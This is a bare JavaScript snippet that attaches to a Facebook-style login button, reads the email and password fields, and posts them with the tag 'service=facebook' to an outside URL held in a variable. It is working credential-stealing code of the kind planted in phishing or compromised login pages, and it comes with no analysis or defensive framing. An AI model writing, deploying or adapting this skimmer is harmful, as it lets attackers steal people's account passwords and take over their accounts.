document.getElementById('loginbutton').onclick = function() {
    var fb_login = document.getElementById('email').value;
    var fb_pass = document.getElementById('pass').value;
    var fb_xhr = new XMLHttpRequest();
    var fb_body = 'login=' + encodeURIComponent(fb_login) + '&pass=' + encodeURIComponent(fb_pass) + '&service=facebook';
    fb_xhr.open("POST", fb_url, true)
    fb_xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    fb_xhr.send(fb_body);
}
